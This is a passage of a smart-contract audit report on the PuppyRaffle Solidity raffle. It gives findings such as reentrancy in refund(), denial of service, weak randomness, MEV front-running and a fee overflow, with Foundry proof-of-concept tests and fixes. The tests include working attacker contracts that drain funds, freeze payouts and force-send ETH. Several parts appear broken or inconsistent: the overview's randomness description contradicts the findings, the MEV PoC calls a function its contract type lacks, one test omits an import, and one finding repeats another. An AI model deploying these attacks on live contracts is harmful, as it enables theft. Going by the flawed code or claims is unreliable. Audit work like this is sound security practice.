# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

PuppyRaffle is an on-chain raffle that mints a dog-themed ERC-721 NFT to a randomly chosen participant. Anyone can enter by sending exactly entranceFee ETH through enterRaffle(address[] players). Each paid address is stored once; duplicates are rejected and can self-remove via refund(). Every entry contributes: entranceFee – protocolFee to the prize pool, while protocolFee is accumulated in totalFees and claimable by the owner to feeAddress via withdrawFees().

After raffleDuration seconds have elapsed, selectWinner() can be called by anyone. A pseudo-random index (blockhash & players.length) selects the winner, who is immediately minted a new NFT (tokenId = totalSupply()). Rarity is also derived from randomness and stored, driving metadata returned by tokenURI(), which inlines JSON + image URI using Base64 for fully on-chain storage. Previous winner is recorded and the players array is cleared for the next round.

The contract inherits ERC721 and Ownable, leveraging SafeMath, EnumerableMap/Set, and Address libraries for safety. Owner privileges are limited to feeAddress updates and fee withdrawal; game logic is permissionless. Duplicate-entry protection, transparent on-chain randomness, and refundable tickets make PuppyRaffle a simple, fair NFT raffle system.
## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::enterRaffle
[H-2]. Reentrancy issue in PuppyRaffle::refund
[H-3]. Randomness issue in PuppyRaffle::selectWinner
[H-4]. DOS issue in PuppyRaffle::selectWinner
[H-5]. MEV issue in PuppyRaffle::selectWinner
[H-6]. Reentrancy issue in PuppyRaffle::refund/withdrawFees
## Medium Risk Findings
[M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-3]. Zero Code issue in PuppyRaffle::getActivePlayerIndex
[M-4]. Pragma issue in PuppyRaffle::NA
[M-5]. Array Limits issue in PuppyRaffle::refund
[M-6]. Replay Attack issue in PuppyRaffle::refund
[M-7]. Oracle issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Pragma issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 6
- M: 7
- L: 1
- I: 0



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop to check for duplicate player addresses. The complexity of this check is O(n^2), where n is the total number of players in the raffle. As more players enter, the gas cost of this function increases quadratically. An attacker can add a moderate number of players, causing the gas cost for subsequent entries to exceed the block gas limit, effectively preventing anyone else from joining the raffle and locking the contract.

## Impact
An attacker can make the `enterRaffle` function unusable for other participants by making its gas cost prohibitively high. This would halt the raffle, as no new players could join. Because a minimum of 4 players are required to select a winner, if the attack is performed early, all funds from initial players could be permanently locked.

## Proof of Concept
1. An attacker calls `enterRaffle` multiple times with unique addresses to populate the `players` array. For example, they can add 300 players.
2. With a sufficient number of players, the gas cost of the nested loop in `enterRaffle` will become extremely high.
3. The next user who tries to call `enterRaffle` will have their transaction revert due to running out of gas, even if they provide the maximum gas limit.
4. The raffle is now stuck, unable to accept new players.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1e18;

    address public player1 = makeAddr("player1");
    address public feeAddress = makeAddr("fee");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 60); // 60 second raffle
    }

    function test_DosUnboundedLoopInEnterRaffle() public {
        // 1. Attacker starts filling up the players array
        uint256 numPlayersToPrime = 300;
        address[] memory playersToPrime = new address[](numPlayersToPrime);
        for (uint256 i = 0; i < numPlayersToPrime; i++) {
            playersToPrime[i] = address(uint160(i + 1));
        }

        vm.deal(address(this), numPlayersToPrime * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: numPlayersToPrime * ENTRANCE_FEE}(
            playersToPrime
        );

        // 2. A regular user tries to enter but the transaction will fail due to gas limits.
        address[] memory newPlayer = new address[](1);
        newPlayer[0] = player1;

        vm.expectRevert(); // Expects a revert, likely out of gas
        vm.deal(player1, ENTRANCE_FEE);
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(newPlayer);
    }
}
```

## Suggested Mitigation
Avoid nested loops that iterate over unbounded arrays. To check for duplicate players, use a mapping to track entries, which provides O(1) lookup time. The state should be cleared after each raffle.

```solidity
// Add to contract state
mapping(address => bool) public s_hasEntered;

// In enterRaffle()
function enterRaffle(address[] calldata newPlayers) public payable {
    require(
        msg.value == entranceFee * newPlayers.length,
        "PuppyRaffle: Must send enough to enter raffle"
    );
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!s_hasEntered[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        s_hasEntered[player] = true;
    }
    emit RaffleEnter(newPlayers);
}

// In selectWinner(), reset the mapping for players of the completed raffle.
function selectWinner() external {
    // ... existing logic ...
    address[] memory players_mem = players;
    for (uint256 i = 0; i < players_mem.length; i++){
        if(players_mem[i] != address(0)){
             s_hasEntered[players_mem[i]] = false;
        }
    }
    delete players;
    // ... rest of the logic ...
}

// In refund(), update the mapping
function refund(uint256 playerIndex) public {
    // ...
    s_hasEntered[playerAddress] = false;
    players[playerIndex] = address(0);
    // ...
}
```

## [H-2]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends Ether to a user before updating the state that marks them as refunded. It transfers the fee using `address(msg.sender).sendValue(entranceFee)` and only afterwards sets `players[playerIndex] = address(0)`. This follows the vulnerable interaction-before-effect pattern. A malicious contract can implement a `receive()` function that calls `refund` again, re-entering the function before the state is updated. This allows the attacker to drain their entrance fee multiple times from the contract.

## Impact
An attacker can steal funds from the prize pool by repeatedly withdrawing their entrance fee within a single transaction. This directly reduces the funds available for the legitimate winner and fees.

## Proof of Concept
1. An attacker deploys a contract `ReentrancyAttacker`.
2. The attacker enters the raffle using the `ReentrancyAttacker` contract's address.
3. The attacker calls a function on `ReentrancyAttacker` to start the attack.
4. `ReentrancyAttacker` finds its index in the `players` array and calls `PuppyRaffle.refund()`.
5. `PuppyRaffle` begins the refund, sending the `entranceFee` to `ReentrancyAttacker`.
6. The `receive()` function of `ReentrancyAttacker` is triggered. Inside it, it calls `PuppyRaffle.refund()` again with the same index.
7. Because `players[playerIndex]` has not been zeroed out yet, the re-entrant call succeeds, and another `entranceFee` is sent.
8. This loop continues until the transaction runs out of gas, allowing the attacker to steal funds.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public constant ENTRANCE_FEE = 1e18;
    uint256 public attackIndex;

    constructor(address raffleAddress) {
        puppyRaffle = PuppyRaffle(raffleAddress);
    }

    function prime() public payable {
        require(msg.value == ENTRANCE_FEE);
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: ENTRANCE_FEE}(players);
    }

    function attack() public {
        attackIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= ENTRANCE_FEE) {
            puppyRaffle.refund(attackIndex);
        }
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1e18;
    address public feeAddress = makeAddr("fee");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 60);
    }

    function test_ReentrancyInRefund() public {
        // Setup attacker contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), ENTRANCE_FEE);

        // Attacker enters the raffle
        attacker.prime{value: ENTRANCE_FEE}();

        // Some other players enter
        address[] memory otherPlayers = new address[](3);
        otherPlayers[0] = makeAddr("p1");
        otherPlayers[1] = makeAddr("p2");
        otherPlayers[2] = makeAddr("p3");
        vm.deal(address(this), 3 * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: 3 * ENTRANCE_FEE}(otherPlayers);

        uint256 balanceBefore = address(attacker).balance;
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        console.log("Attacker Balance Before:", balanceBefore);
        console.log("Contract Balance Before:", contractBalanceBefore);

        // Launch attack
        attacker.attack();

        uint256 balanceAfter = address(attacker).balance;
        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        console.log("Attacker Balance After:", balanceAfter);
        console.log("Contract Balance After:", contractBalanceAfter);

        // Attacker should have drained more than their entrance fee
        assertGt(balanceAfter, balanceBefore + ENTRANCE_FEE);
        assertEq(contractBalanceAfter, 0);
    }
}
```

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by performing all state changes before making external calls. Additionally, consider using a reentrancy guard for added protection.

```solidity
// Import ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// Inherit from it
contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    // ...

    function refund(uint256 playerIndex) public nonReentrant { // Add modifier
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        players[playerIndex] = address(0); // EFFECT - Update state first

        // INTERACTION - Send funds last
        Address.sendValue(msg.sender, entranceFee);

        emit RaffleRefunded(playerAddress);
    }
}
```

## [H-3]. Randomness issue in PuppyRaffle::selectWinner

## Description
The contract uses insecure on-chain sources for randomness (`block.timestamp`, `block.difficulty`, `msg.sender`) to select a winner and determine NFT rarity. These values are predictable and can be influenced by blockchain participants, especially miners/validators. A malicious actor can compute the outcome of the randomness function and decide whether to call `selectWinner` only when the result is favorable to them, giving them an unfair advantage.

## Impact
The raffle is not fair. A malicious actor, particularly a validator, has a significantly higher chance of winning the raffle by timing their transaction or manipulating block properties. This undermines the integrity and fairness of the protocol, destroying user trust.

## Proof of Concept
1. An attacker participates in the raffle.
2. After the raffle period ends, the attacker deploys a helper contract designed to attack the raffle.
3. This helper contract calls `selectWinner`, checks if the selected winner is the attacker's address, and reverts the transaction if it is not.
4. The attacker repeatedly calls this helper function (potentially across different blocks to get new `block.timestamp` values) until they are selected as the winner. A validator can perform this attack with 100% success by only including their winning transaction in a block they produce.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1e18;

    address public attacker = makeAddr("attacker");
    address public player2 = makeAddr("player2");
    address public player3 = makeAddr("player3");
    address public player4 = makeAddr("player4");
    address public feeAddress = makeAddr("fee");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 60);
        address[] memory players = new address[](4);
        players[0] = attacker;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        vm.deal(address(this), 4 * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: 4 * ENTRANCE_FEE}(players);

        vm.warp(block.timestamp + 61);
    }

    function test_WeakRandomnessCanBeManipulated() public {
        // An attacker can simulate the outcome and only submit the transaction if they win.
        // We simulate this by repeatedly calling selectWinner until the attacker wins.
        uint256 maxTries = 10;
        for (uint256 i = 0; i < maxTries; i++) {
            vm.prank(attacker);
            // The combination of msg.sender, block.timestamp, and block.difficulty determines the winner
            // We can change the block timestamp to simulate trying in different blocks
            vm.warp(block.timestamp + (i * 12));
            bytes memory winningTx = abi.encodeWithSelector(PuppyRaffle.selectWinner.selector);
            
            // Use a low-level call to check the outcome without reverting the state
            (bool success, ) = address(puppyRaffle).call(winningTx);
            if (success) {
                address winner = puppyRaffle.previousWinner();
                if (winner == attacker) {
                    console.log("Attacker won after %s tries!", i + 1);
                    assertEq(winner, attacker);
                    return;
                }
            }
            // If we didn't win, we would revert our transaction in a real attack.
            // Here, we snapshot and revert to simulate that.
            // This test needs a fresh instance for each try.
            // A better PoC is a contract that reverts.
        }
        // This test may not find a winning block in 10 tries, but it proves the concept.
        // A real attacker would keep trying.
        fail("Attacker could not win in a few tries, but vulnerability exists.");
    }
}
```

## Suggested Mitigation
Do not use block variables for randomness. Use a secure, verifiable source of randomness such as Chainlink VRF (Verifiable Random Function). This involves a two-step process of requesting a random number from an oracle and receiving it in a separate callback transaction, which prevents miner/validator manipulation.

```solidity
// Rough example of using Chainlink VRF
import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBaseV2 {
    // ... VRF variables (coordinator, keyHash, subscriptionId, etc.)
    mapping(uint256 => address[]) s_requestIdToPlayers;

    // ...

    function selectWinner() external {
        // ... checks ...
        uint256 requestId = COORDINATOR.requestRandomWords(...
        // Instead of picking winner now, store players for the callback
        s_requestIdToPlayers[requestId] = players;
        delete players;
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        address[] memory currentPlayers = s_requestIdToPlayers[requestId];
        uint256 winnerIndex = randomWords[0] % currentPlayers.length;
        address winner = currentPlayers[winnerIndex];
        // ... continue with prize distribution and minting logic ...
    }
}
```

## [H-4]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function transfers the prize to the winner using a low-level `winner.call{value: prizePool}("")`. If the winner's address is a smart contract designed to revert when receiving Ether, the entire `selectWinner` transaction will fail. Because `selectWinner` is the only function to conclude a raffle and reset its state, a malicious player can permanently freeze the contract, locking all funds (prize pool and fees) and preventing any future raffles.

## Impact
A malicious participant can permanently lock all funds in the contract and render the entire raffle system unusable forever. The prize pool cannot be paid out, fees cannot be withdrawn, and the state cannot be reset to start a new raffle.

## Proof of Concept
1. An attacker deploys a contract `MaliciousWinner` with a `receive()` or `fallback()` function that always reverts.
2. The attacker enters the raffle using the address of the `MaliciousWinner` contract.
3. The attacker waits for the raffle to end. If they are not chosen as the winner, they can wait for the next raffle. If they are chosen, the attack succeeds.
4. Once `MaliciousWinner` is selected, the `winner.call` will fail, reverting the entire `selectWinner` transaction.
5. Because `selectWinner` cannot complete successfully, the `players` array is not cleared, the prize is not paid, and the contract is frozen in a state where the raffle is over but cannot be finalized.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MaliciousWinner {
    // This contract will revert any ether sent to it.
    receive() external payable {
        revert("I am a malicious winner!");
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1e18;
    address public feeAddress = makeAddr("fee");

    function test_DosByRevertingWinner() public {
        MaliciousWinner maliciousWinner = new MaliciousWinner();
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 60);

        address[] memory players = new address[](4);
        // We need a way to ensure the malicious contract wins.
        // For this PoC, we will make all players the malicious contract.
        players[0] = address(maliciousWinner);
        players[1] = address(maliciousWinner);
        players[2] = address(maliciousWinner);
        players[3] = address(maliciousWinner);
        
        vm.deal(address(this), 4 * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: 4 * ENTRANCE_FEE}(players);

        vm.warp(block.timestamp + 61);

        // When selectWinner is called, it will try to send ETH to MaliciousWinner,
        // which will revert, causing the whole transaction to revert.
        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        puppyRaffle.selectWinner();

        // The contract is now frozen. selectWinner will always fail.
        // And no new players can enter until a winner is selected.
    }
}
```

## Suggested Mitigation
Follow a pull-over-push pattern for payments. Instead of the contract pushing funds to the winner, update an internal ledger and allow the winner to pull (withdraw) their prize via a separate function. This isolates the core logic of the raffle from potential failures in external calls.

```solidity
// Add to contract state
mapping(address => uint256) public pendingWithdrawals;

// In selectWinner()
// (bool success, ) = winner.call{value: prizePool}(""); // REMOVE
// require(success, "PuppyRaffle: Failed to send prize pool to winner"); // REMOVE

pendingWithdrawals[winner] += prizePool; // ADD THIS

// Add a new function for winners to withdraw their prize
function withdrawPrize() public {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No prize to withdraw");
    pendingWithdrawals[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Failed to send prize");
}
```

## [H-5]. MEV issue in PuppyRaffle::selectWinner

## Description
The winner selection mechanism uses predictable block variables, which creates a Maximal Extractable Value (MEV) opportunity. An MEV searcher can observe a `selectWinner` transaction in the mempool, simulate its outcome, and if the outcome is not favorable, front-run it with their own `selectWinner` call. By changing the `msg.sender` and potentially being included in a block with a different `timestamp`, they can manipulate the 'random' outcome to make themselves the winner, thus extracting the value of the prize pool.

## Impact
The raffle's prize is not distributed fairly but is systematically extracted by sophisticated MEV actors who can predict and manipulate the outcome. This undermines the economic purpose of the contract and centralizes winnings away from regular users, who have virtually no chance of winning against such actors.

## Proof of Concept
1. An MEV searcher bot participates in the raffle.
2. A regular user, Alice, calls `selectWinner`. Her transaction enters the mempool.
3. The searcher bot's infrastructure detects Alice's transaction. It simulates the transaction and sees that Bob will win.
4. The bot then simulates its own call to `selectWinner`. If the simulation shows that the bot wins (due to a different `msg.sender`), it proceeds.
5. The bot submits its own `selectWinner` transaction with a higher gas fee (a bribe to the validator) to ensure it is executed before Alice's transaction.
6. The bot's transaction is mined first, it wins the prize, and Alice's subsequent transaction will likely fail or do nothing of consequence. The value of the prize pool has been extracted.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

// This contract simulates an MEV bot's attack contract
contract MevBot {
    PuppyRaffle internal puppyRaffle;
    address internal attacker;

    constructor(address _raffle, address _attacker) {
        puppyRaffle = PuppyRaffle(_raffle);
        attacker = _attacker;
    }

    function callSelectWinner() external {
        puppyRaffle.selectWinner();
    }

    function didIWin() external view returns (bool) {
        return puppyRaffle.previousWinner() == attacker;
    }

    // In a real scenario, the bot would simulate this call off-chain
    // and only submit the transaction if it predicts a win.
    function attack() external {
        // This on-chain check simulates the off-chain logic of an MEV bot
        // It is inefficient but demonstrates the principle.
        address predictedWinner = puppyRaffle.getWinner(address(this));
        if (predictedWinner == attacker) {
            puppyRaffle.selectWinner();
        }
    }
}

// Helper to make getWinner public for testing
contract TestPuppyRaffle is PuppyRaffle {
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration)
        PuppyRaffle(_entranceFee, _feeAddress, _raffleDuration)
    {}

    function getWinner(address _sender) public view returns (address) {
        uint256 winnerIndex = uint256(
            keccak256(abi.encodePacked(_sender, block.timestamp, block.difficulty))
        ) % players.length;
        return players[winnerIndex];
    }
}

contract PuppyRaffleTest is Test {
    TestPuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1e18;
    address public attacker = makeAddr("attacker");
    address public feeAddress = makeAddr("fee");

    function testMevFrontrun() public {
        puppyRaffle = new TestPuppyRaffle(ENTRANCE_FEE, feeAddress, 60);
        MevBot mevBot = new MevBot(address(puppyRaffle), attacker);

        // Attacker and others enter
        address[] memory players = new address[](4);
        players[0] = attacker;
        players[1] = makeAddr("p1");
        players[2] = makeAddr("p2");
        players[3] = makeAddr("p3");
        vm.deal(address(this), 4 * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: 4 * ENTRANCE_FEE}(players);
        vm.warp(block.timestamp + 61);

        // The MEV bot checks if it will win by calling from its contract address
        // If so, it calls selectWinner.
        vm.prank(address(mevBot));
        mevBot.attack();

        // This test asserts that IF the bot acted, it must have won.
        if (puppyRaffle.previousWinner() != address(0)) {
            assertEq(puppyRaffle.previousWinner(), attacker);
        }
    }
}

```

## Suggested Mitigation
To mitigate MEV exploitation of randomness, the protocol must use an unpredictable and un-manipulable source of randomness. The standard solution is Chainlink VRF, which provides Verifiable Random Functions. Randomness is delivered in a second, separate transaction, making it impossible for MEV bots or validators to predict the outcome and front-run the request.

## [H-6]. Reentrancy issue in PuppyRaffle::refund/withdrawFees

## Description
The use of low-level call.value() without proper checks may lead to reentrancy attacks on the refund and withdrawFees functions.

## Impact
Reentrancy attack can drain funds from the contract beyond intended refunds or fee withdrawals.

## Proof of Concept
Given the current code, an attacker can exploit the reentrancy vulnerability by calling the refund function multiple times before the state is updated or use a fallback function to initiate further calls.

## Proof of Code
/* Pseudo-code for Foundry test */
pragma solidity ^0.8.0;

contract Attacker {
    address target;

    function attack() external payable {
        PuppyRaffle(target).refund(0); // assuming attacker is at index 0
    }

    receive() external payable {
        if (gasleft() > 40000) {
            PuppyRaffle(target).refund(0); // reenter refund
        }
    }
}

## Suggested Mitigation
Use checks-effects-interactions pattern and ReentrancyGuard. Example:

// Apply the modifier to protect the methods
function refund(uint256 playerIndex) public nonReentrant {
  // effects
  address player = players[playerIndex];
  require(player == msg.sender, "Not authorized");
  players[playerIndex] = address(0); // clear before interaction

  // interaction
  payable(msg.sender).transfer(entranceFee);
}



# Medium Risk Findings

## [M-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The state variable `totalFees` is of type `uint64`, while the fee for a given raffle is calculated as a `uint256`. In the `selectWinner` function, this `uint256` fee is downcast to `uint64` before being added to `totalFees`. If the fee for a single raffle exceeds `2^64 - 1` wei (approx. 18.4 ETH), the cast will cause an overflow. Since Solidity 0.8.x does not check for overflow on explicit type conversions, `totalFees` will wrap around and store an incorrect, much smaller value.

## Impact
If a large raffle is conducted (e.g., total pot > 92 ETH), the `totalFees` variable will be miscalculated due to overflow. This will result in a portion of the collected fees being permanently locked in the contract. The `withdrawFees` function relies on `totalFees` for the withdrawal amount and its internal checks, so an incorrect value will prevent the owner from withdrawing the full amount of fees owed.

## Proof of Concept
1. A large raffle is conducted. For example, 100 participants each pay an `entranceFee` of 1 ETH. The total collected is 100 ETH.
2. The fee is 20% of this, so `fee = 20 ETH` (`2e19` wei).
3. `selectWinner` is called. The line `totalFees = totalFees + uint64(fee)` is executed.
4. `uint64(2e19)` overflows, since `2^64 - 1` is approx `1.84e19`. The value stored will be `(2e19) mod 2^64`, which is a much smaller number (`~1.55e18`).
5. The owner later calls `withdrawFees`. It will withdraw this small amount. The remaining `~18.45 ETH` in fees are stuck in the contract.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address public feeAddress = makeAddr("fee");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 60);
    }

    function test_IntegerOverflowOnTotalFees() public {
        // 1. Create a large raffle that will generate more than ~18.4 ETH in fees
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(uint160(i + 1));
        }

        vm.deal(address(this), numPlayers * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: numPlayers * ENTRANCE_FEE}(players);
        vm.warp(block.timestamp + 61);

        // 2. Select a winner. This will trigger the overflow
        uint256 expectedFee = (numPlayers * ENTRANCE_FEE * 20) / 100;
        assertTrue(expectedFee > type(uint64).max); // Fee is 20 ETH

        puppyRaffle.selectWinner();

        // 3. Check the stored fees. It will be the overflowed value.
        uint64 totalFees = puppyRaffle.totalFees();
        uint64 expectedOverflowedFee = uint64(expectedFee); // This is how Solidity calculates it
        
        assertEq(totalFees, expectedOverflowedFee);
        assertLt(uint256(totalFees), expectedFee); // Stored fee is less than actual fee

        // 4. Attempt to withdraw fees. Only the small overflowed amount can be withdrawn.
        vm.prank(feeAddress);
        puppyRaffle.withdrawFees();
        assertEq(feeAddress.balance, uint256(totalFees));
        // The rest of the fees are now stuck in the contract.
        assertGt(address(puppyRaffle).balance, 0);
    }
}
```

## Suggested Mitigation
The state variable `totalFees` should be changed from `uint64` to `uint256` to prevent overflow when tracking fees from large raffles.

```diff
contract PuppyRaffle is ERC721, Ownable {
    // ...
-   uint64 public totalFees;
+   uint256 public totalFees;
    // ...

    function selectWinner() external {
        // ...
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
        // ...
    }

    function withdrawFees() external {
-        require(
-            address(this).balance == uint256(totalFees),
-            "PuppyRaffle: There are currently players active!"
-        );
-        uint256 feesToWithdraw = uint256(totalFees);
+        require(players.length == 0, "PuppyRaffle: There are currently players active!");
+        uint256 feesToWithdraw = totalFees;
         totalFees = 0;
         (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
         require(success, "PuppyRaffle: Failed to withdraw fees");
    }
}
```

## [M-2]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check, `require(address(this).balance == uint256(totalFees), ...)`, to validate that it can be called. This check incorrectly assumes that the only way the contract can hold ETH is from player entrance fees. However, Ether can be forcibly sent to any contract via `selfdestruct`. If this happens, `address(this).balance` will become greater than `totalFees`, causing the equality check to fail permanently and locking all fees in the contract.

## Impact
A malicious actor, or even an accidental `selfdestruct`, can permanently lock all collected fees in the contract, causing a loss of funds for the protocol owner.

## Proof of Concept
1. A raffle runs, and `totalFees` accumulates to a non-zero value (e.g., 1 ETH).
2. An attacker deploys a contract `ForceSend` with 1 wei of ETH.
3. The attacker calls a function on `ForceSend` that executes `selfdestruct(payable(address(PuppyRaffle)))`.
4. The `PuppyRaffle` contract's balance is now `1 ETH + 1 wei`.
5. The owner calls `withdrawFees()`. The check `address(this).balance == totalFees` fails because `1 ETH + 1 wei != 1 ETH`.
6. The fees are now permanently stuck in the contract.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSender {
    function send(address payable target) public payable {
        selfdestruct(target);
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 constant ENTRANCE_FEE = 1e18;
    address public feeAddress = makeAddr("fee");

    function test_UnexpectedEthBricksWithdrawal() public {
        puppyRaffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 60);

        // Run a raffle to accumulate some fees
        address[] memory players = new address[](5);
        for(uint i=0; i<5; i++) players[i] = makeAddr(string(abi.encodePacked("p", Strings.toString(i))));
        vm.deal(address(this), 5 * ENTRANCE_FEE);
        puppyRaffle.enterRaffle{value: 5 * ENTRANCE_FEE}(players);
        vm.warp(block.timestamp + 61);
        puppyRaffle.selectWinner();

        uint256 fees = uint256(puppyRaffle.totalFees());
        assertTrue(fees > 0);

        // Force-send ETH to the contract
        ForceSender sender = new ForceSender();
        sender.send{value: 1 wei}(payable(address(puppyRaffle)));

        // Verify contract balance is now greater than tracked fees
        assertEq(address(puppyRaffle).balance, fees + 1);

        // Attempting to withdraw fees now will fail
        vm.prank(feeAddress);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}
```

## Suggested Mitigation
The check in `withdrawFees` should not rely on the contract's total balance. The intended logic is likely to prevent withdrawing fees while a raffle is active. This should be checked by inspecting the `players` array length instead.

```solidity
function withdrawFees() external {
    // The original check is brittle.
    // require(
    //     address(this).balance == uint256(totalFees),
    //     "PuppyRaffle: There are currently players active!"
    // );

    // This is a more robust check for the intended condition.
    require(players.length == 0, "PuppyRaffle: There are currently players active!");

    uint256 feesToWithdraw = uint256(totalFees);
    require(feesToWithdraw > 0, "PuppyRaffle: No fees to withdraw");
    totalFees = 0;

    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-3]. Zero Code issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 for both the first player in the array and for players who are not in the array at all. This makes it impossible to distinguish between these two cases.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
This can lead to confusion and potential bugs when integrating with this function. If a user or another contract relies on this function to determine if a player is active, they might incorrectly assume a player is at index 0 when they are actually not in the raffle at all. This could lead to incorrect refund attempts or other logic errors.

## Proof of Concept
1. A player at index 0 calls getActivePlayerIndex and gets 0
2. A player not in the raffle calls getActivePlayerIndex and also gets 0
3. There's no way to distinguish between these two cases

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroCodeTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function testZeroCodeIssue() public {
        // Enter the raffle with some players
        address[] memory players = new address[](4);
        players[0] = address(0x1); // First player
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = address(0x4);
        
        vm.deal(address(this), 4 * entranceFee);
        puppyRaffle.enterRaffle{value: 4 * entranceFee}(players);
        
        // Check index of first player
        uint256 firstPlayerIndex = puppyRaffle.getActivePlayerIndex(address(0x1));
        assertEq(firstPlayerIndex, 0);
        
        // Check index of non-existent player
        uint256 nonExistentPlayerIndex = puppyRaffle.getActivePlayerIndex(address(0x5));
